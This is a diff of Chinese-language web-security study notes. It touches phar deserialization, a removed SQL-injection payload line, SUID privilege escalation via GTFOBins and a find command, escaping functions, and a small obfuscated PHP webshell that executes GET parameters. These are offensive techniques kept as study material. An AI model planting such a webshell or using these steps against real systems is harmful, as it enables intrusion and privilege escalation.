@@ -488,14 +566,7 @@ echo serialize($conn);
 
 phar文件是PHP代码和资源的压缩包，其中以序列化形式存储了phar元数据。PHP以`phar://`封装协议访问phar文件时会反序列元数据。结合文件上传漏洞 + 可以控制文件名的文件操作（例如`example.com/download?file=phar://phar.gif`）就能利用反序列化攻击
 
-## XXE
-
-```python
-payload = f"hex(hex(substr((select flag from flag) from {i} for 1))),/"
-print(f"[] Testing position {i}, payload: {payload}")
-```
-
-# 操作系统漏洞
+# 后渗透
 
 [GTFOBins](https://gtfobins.github.io/)收录了许多用Linux指令绕过操作系统安全策略的方法
 
@@ -509,14 +580,6 @@ find / -perm -u=s -user root -type f 2>/dev/null  # 查找SUID指令
 ```
 
 能用SUID提权的指令有：wget
-
-# 其他
-
-## 转义
-
-URI、HTML、SQL
-
-php: `htmlspecialchars`；mysqli：`mysqli_real_escape_string`
 
 ## webshell
 
@@ -540,11 +603,10 @@ $a = $_GET['xymhwv'];
 $a($_GET['ehnzmq']);
 ```
 
+# 其他
 
+## 转义
 
+URI、HTML、SQL
 
-
-
-
-
-
+php: `htmlspecialchars`；mysqli：`mysqli_real_escape_string`
